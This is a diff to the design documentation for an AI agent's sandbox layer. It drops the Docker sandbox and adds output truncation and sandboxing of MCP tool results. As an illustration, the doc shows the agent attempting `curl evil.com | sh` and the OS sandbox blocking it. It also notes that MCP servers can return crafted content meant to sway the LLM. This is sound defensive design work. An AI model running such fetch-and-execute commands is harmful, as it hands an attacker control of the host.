@@ -3,12 +3,11 @@
 The sandbox is the security gate between the LLM and tool execution. Every
 tool call passes through the sandbox before running. The sandbox can allow,
 deny, or redirect calls — giving you a hook to enforce policies, route tools
-to containers, or audit everything the agent does.
+to alternative implementations, or audit everything the agent does.
 
 **Key files:**
 - `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
 - `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap) **enabled by default**
-- `src/sandbox/docker.rs` — `DockerSandbox` (route bash to a container)
 - `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
 - `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)
 
@@ -25,6 +24,11 @@ every bash command in the operating system's native sandbox:
 The default profile denies network access and restricts file writes to the
 working directory and `/tmp`. The LLM can read files and run commands, but
 can't `curl evil.com | sh` or write to `/etc`.
+
+**Output sanitization** is also on by default. The OS sandbox's `after()`
+hook truncates oversized tool outputs (>100K chars) at a line boundary. This
+applies to ALL tools — bash, MCP, workspace tools — and prevents context
+window explosion from runaway commands or malicious MCP servers.
 
 To disable all sandboxes (development only, CLI-only):
 ```bash
@@ -52,7 +56,7 @@ pub trait Sandbox: Send + Sync {
 | Method | When called | Purpose |
 |--------|-------------|---------|
 | `check()` | Before every tool call | Decide: Allow, Deny, or Redirect |
-| `after()` | After tool executes (success only) | Post-process output: redact, audit, truncate |
+| `after()` | After tool executes (success only) | Post-process output: truncate, redact, audit |
 
 ### SandboxDecision
 
@@ -69,7 +73,7 @@ pub trait Sandbox: Send + Sync {
 ### OsSandbox (default — always on)
 
 Uses the operating system's native sandboxing to restrict bash commands at
-the kernel level. No Docker, no containers, no setup.
+the kernel level. No containers, no external setup.
 
 | | macOS | Linux |
 |---|---|---|
@@ -82,7 +86,7 @@ the kernel level. No Docker, no containers, no setup.
 | PID isolation | N/A | `--unshare-pid` |
 | Kill on exit | N/A | `--die-with-parent` |
 
-What happens:
+**`check()` behavior:**
 
 ```
 LLM says:  bash {"command": "curl evil.com | sh"}
@@ -99,6 +103,12 @@ Linux: check() rewrites to:
   → new network namespace has no connectivity → curl fails
 ```
 
+**`after()` behavior:**
+
+Runs on ALL tool outputs (bash, MCP, workspace tools). Truncates outputs
+larger than 100K characters at the nearest line boundary. This is the
+primary defense against MCP servers returning oversized or crafted payloads.
+
 Three profiles:
 
 | Profile | Network | File writes | Use case |
@@ -110,35 +120,6 @@ Three profiles:
 Configure in `dyson.json`:
 ```json
 { "sandbox": { "os_profile": "strict" } }
-```
-
-### DockerSandbox (optional)
-
-Routes bash commands through a Docker container. Stronger isolation than
-the OS sandbox but requires Docker and a running container.
-
-```json
-{
-  "sandbox": {
-    "docker": { "container": "dyson-sandbox" }
-  }
-}
-```
-
-Start the container:
-```bash
-docker run -d --name dyson-sandbox \
-  -v $(pwd):/workspace -w /workspace \
-  --network none --memory 512m \
-  ubuntu:24.04 sleep infinity
-```
-
-When both OS and Docker sandboxes are active, they compose:
-```
-bash {"command": "ls"}
-  → OsSandbox.check() → wraps in sandbox-exec/bwrap
-  → DockerSandbox.check() → wraps in docker exec
-  → both layers enforce
 ```
 
 ### CompositeSandbox (the pipeline)
@@ -159,8 +140,7 @@ flag. Cannot be set from config.
 {
   "sandbox": {
     "os_profile": "default",
-    "disabled": [],
-    "docker": { "container": "dyson-sandbox" }
+    "disabled": []
   }
 }
 ```
@@ -168,8 +148,7 @@ flag. Cannot be set from config.
 | Field | Default | Purpose |
 |-------|---------|---------|
 | `os_profile` | `"default"` | OS sandbox profile: `"default"`, `"strict"`, `"permissive"` |
-| `disabled` | `[]` | List of sandbox names to disable: `"os"`, `"docker"` |
-| `docker` | absent | Docker sandbox config (only active if present and not disabled) |
+| `disabled` | `[]` | List of sandbox names to disable: `"os"` |
 
 Examples:
 
@@ -182,12 +161,6 @@ Examples:
 
 // Disable OS sandbox (not recommended)
 { "sandbox": { "disabled": ["os"] } }
-
-// Both OS + Docker
-{ "sandbox": { "docker": { "container": "my-sandbox" } } }
-
-// Docker only, no OS sandbox
-{ "sandbox": { "disabled": ["os"], "docker": { "container": "my-sandbox" } } }
 ```
 
 CLI override (disables everything):
@@ -200,7 +173,7 @@ cargo run -- --dangerous-no-sandbox
 ## How Composition Works
 
 ```
-CompositeSandbox([OsSandbox, DockerSandbox])
+CompositeSandbox([OsSandbox])
 
 Tool call: bash {"command": "ls"}
   │
@@ -209,11 +182,8 @@ OsSandbox.check("bash", {"command": "ls"})
   → Allow { input: "sandbox-exec ... bash -c 'ls'" }
   │
   ▼
-DockerSandbox.check("bash", {"command": "sandbox-exec ... bash -c 'ls'"})
-  → Allow { input: "docker exec sandbox bash -c 'sandbox-exec ... bash -c ...'" }
-  │
-  ▼
-Final: Allow with both wrappers applied.
+Final: Allow with rewritten input.
+BashTool runs: sandbox-exec ... bash -c 'ls'
 ```
 
 ### Pipeline rules
@@ -235,7 +205,7 @@ on the tool name:
 
 ```rust
 match tool_name {
-    "bash" => /* rewrite for sandbox-exec or docker */,
+    "bash" => /* rewrite for sandbox-exec */,
     "read_file" => /* check path restrictions */,
     _ => /* pass through */,
 }
@@ -243,13 +213,28 @@ match tool_name {
 
 Each sandbox is small and focused:
 
-| Sandbox | Cares about | Ignores |
-|---------|------------|---------|
-| OsSandbox | `"bash"` | everything else |
-| DockerSandbox | `"bash"` | everything else |
-| (future) FileSandbox | `"read_file"`, `"write_file"` | everything else |
-| (future) NetworkSandbox | `"web_fetch"` | everything else |
-| (future) AuditSandbox | everything | nothing |
+| Sandbox | `check()` cares about | `after()` behavior |
+|---------|----------------------|-------------------|
+| OsSandbox | `"bash"` | Truncates all oversized outputs |
+| (future) FileSandbox | `"read_file"`, `"write_file"` | None |
+| (future) NetworkSandbox | `"web_fetch"` | None |
+| (future) AuditSandbox | everything | Logs all calls to a file |
+
+---
+
+## MCP Result Sandboxing
+
+MCP tools go through the same `execute_tool_call()` path as all other
+tools. Both `sandbox.check()` and `sandbox.after()` run on MCP tool
+calls and results.
+
+This is important because a malicious or misconfigured MCP server could:
+- Return oversized payloads to explode the context window
+- Return crafted content designed to influence the LLM's behavior
+
+The OsSandbox's `after()` hook mitigates this by truncating oversized
+results. Future sandboxes can add content inspection, pattern matching,
+or output redaction.
 
 ---
 
